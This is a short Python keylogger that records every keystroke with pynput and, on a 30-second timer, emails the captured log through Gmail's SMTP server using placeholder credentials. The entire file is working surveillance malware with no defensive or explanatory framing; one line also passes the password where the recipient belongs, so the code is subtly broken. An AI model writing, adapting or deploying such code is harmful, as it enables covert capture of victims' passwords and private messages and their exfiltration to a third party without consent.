import pynput.keyboard
import smtplib
import threading

log = ""

def callback_func(key):

    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    
    print(log)

def send_email(email,password,message):
    
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,password,message)
    email_server.quit()

keyLogger_listener = pynput.keyboard.Listener(on_press=callback_func)

def thread_func():
    
    global log
    send_email("example@gmail.com","exaple",log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_func)
    timer_object.start()

# threading
with keyLogger_listener:
    thread_func()
    keyLogger_listener.join()